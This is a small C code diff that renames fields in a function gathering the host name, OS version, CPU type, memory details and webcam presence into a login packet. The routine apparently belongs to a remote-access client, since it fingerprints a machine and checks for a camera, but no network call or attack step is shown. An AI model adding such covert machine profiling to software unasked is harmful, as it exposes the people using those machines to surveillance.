@@ -6,10 +6,10 @@ VOID GetLoginInfo(PBYTE pbLoginPacketBody) {
 	LOGIN_INFO LoginInfo;
 	ZeroMemory(&LoginInfo, sizeof(LOGIN_INFO));
 
-	gethostname(LoginInfo.HostName, 50);
-	GetOSVersion(LoginInfo.OsVersion, 30);
-	GetCpuType(LoginInfo.CpuType, 80);
-	GetMemoryInfo(LoginInfo.MemoryInfo, 30);
+	gethostname(LoginInfo.szHostName, 50);
+	GetOSVersion(LoginInfo.szOsVersion, 30);
+	GetCpuType(LoginInfo.szCpuType, 80);
+	GetMemoryInfo(LoginInfo.szMemoryInfo, 30);
 	LoginInfo.bHaveCamera = HaveCamera();
 	
 	LoginInfo.StructToBuffer(pbLoginPacketBody);
